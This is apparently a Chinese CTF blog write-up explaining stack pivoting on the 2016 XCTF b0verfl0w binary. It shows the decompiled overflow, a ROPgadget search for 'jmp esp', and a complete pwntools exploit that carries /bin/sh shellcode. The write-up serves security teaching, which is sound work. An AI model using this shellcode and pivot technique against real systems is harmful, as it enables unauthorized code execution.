---
title: stack privot攻击技术示例
time: 2017-08-04
tags: [CTF, pwn, stackoverflow]
layout: post
categories: posts
---


# 什么是stack privot?

stack privot字面意思就是栈劫持，是指劫持栈指针指向攻击者放置有利用代码的空间去，比如指向了攻击者构造好的ROP链。

通常，在以下情况我们会考虑使用stack privot技术进行利用
* 可以控制的栈溢出的字节数较少，难以构造较长的ROP链
* 开启了PIE(Position-Independent Executables)保护，栈地址未知，我们可以将栈劫持到已知的区域。
* 其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而利用堆漏洞

如果我们想要劫持栈指针，那么我们所需要的gadget就必须能够控制栈指针，比如`pop sp` `jmp sp` `add sp` `sub sp`之类的gadgets都可能拿来使用。

# 漏洞分析

本节示例的漏洞程序可以从此处下载： [stack_privot](stack_privot)

这是`2016 XCTF Quals-b0verfl0w`, 我们用它来演示这次的stack privot攻击

我们使用IDA反编译，可以看到如下：
``` c
signed int vul()
{
  char s; // [sp+18h] [bp-20h]@1

  puts("\n======================");
  puts("\nWelcome to X-CTF 2016!");
  puts("\n======================");
  puts("What's your name?");
  fflush(stdout);
  fgets(&s, 50, stdin);
  printf("Hello %s.", &s);
  fflush(stdout);
  return 1;
}
```

s的大小为0x20，而总共能写入的字符只有50，再加上ebp，我们能在溢出后实际利用的字节仅仅只有`50-0x20-4=14bytes`，只有这么小的空间，对我们构造攻击代码是十分困难的。我们选择使用stack privot技术，于是来查看一下程序中可以利用的gadgets有哪些

``` bash
➜  stack-privot ROPgadget --binary stack_privot --only 'pop|jmp|ret' | grep 'esp'
0x08048504 : jmp esp
```

那么这样的话，我们就可以借由`jmp esp`将执行流转移到栈上执行。而转移到栈上执行后，我们还需要对esp减上偏移(在返回地址时esp已经和ebp指向同一个地址)，使之转移到我们的buf中继续执行，而buf中我们事先就输入好了shellcode，那么我们在劫持完成后便可以获得一个shell

# 攻击代码

``` python
from pwn import *

shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"

sub_esp_jmp = asm('sub esp, 0x28;jmp esp')
jmp_esp = 0x08048504

payload = shellcode
payload += 'A' * (0x24-len(shellcode))
payload += p32(jmp_esp)
payload += sub_esp_jmp

io = process('./stack_privot')
io.recvuntil("What's your name?\n")
io.send(payload)
io.interactive()

```
